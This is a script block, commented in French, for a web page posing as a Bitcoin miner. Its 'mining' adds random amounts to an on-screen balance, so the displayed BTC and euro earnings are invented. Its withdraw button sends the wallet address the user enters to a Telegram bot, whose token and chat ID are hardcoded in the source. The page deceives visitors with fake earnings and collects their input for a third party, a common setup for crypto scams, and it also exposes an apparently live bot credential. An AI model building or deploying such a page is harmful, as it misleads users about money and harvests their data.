<script>
// ===============================
// CONFIGURATION
// ===============================
const TELEGRAM_BOT_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
const TELEGRAM_CHAT_ID = "7400979339";
const BTC_TO_EUR = 60000;
const MINING_INTERVAL = 400;
const REWARD_MIN = 0.000000000002;
const REWARD_MAX = 0.00000000500;

// ===============================
// ETAT
// ===============================
let balance = 0;
let mining = false;
let minerInterval = null;

const btcEl = document.getElementById('btc');
const eurEl = document.getElementById('eur');
const withdrawBtn = document.getElementById('withdrawBtn');
const logEl = document.getElementById('log');
const walletEl = document.getElementById('wallet');

function log(msg){
  const t = new Date().toLocaleTimeString();
  logEl.innerHTML = `<div>[${t}] ${msg}</div>` + logEl.innerHTML;
}

function updateUI(){
  btcEl.textContent = balance.toFixed(16) + ' BTC';
  eurEl.textContent = '‚âà ' + (balance * BTC_TO_EUR).toFixed(2) + ' ‚Ç¨';
}

// ===============================
// MINAGE AUTOMATIQUE
// ===============================
document.getElementById('startBtn').addEventListener('click', () => {
  if(mining) return;
  mining = true;
  log('‚õèÔ∏è Minage d√©marr√© (rapide & al√©atoire)...');

  minerInterval = setInterval(() => {
    const gain = Math.random() * (REWARD_MAX - REWARD_MIN) + REWARD_MIN;
    balance += gain;
    log(`+${gain.toFixed(16)} BTC`);
    updateUI();
  }, MINING_INTERVAL);
});

// ===============================
// RETRAIT (SANS LIMITE)
// ===============================
withdrawBtn.addEventListener('click', async () => {
  const wallet = walletEl.value.trim();
  if(wallet.length < 20){
    log('‚ùå Adresse wallet invalide');
    return;
  }

  const amount = balance;
  balance = 0;
  updateUI();

  log(`üì§ Retrait simul√© : ${amount.toFixed(16)} BTC`);

  const text = `üì© Retrait simul√©\nMontant: ${amount.toFixed(16)} BTC\nWallet: ${wallet}`;
  try{
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text})
    });
    log('‚úÖ Notification Telegram envoy√©e');
  }catch(e){
    log('‚ùå Erreur Telegram');
  }
});
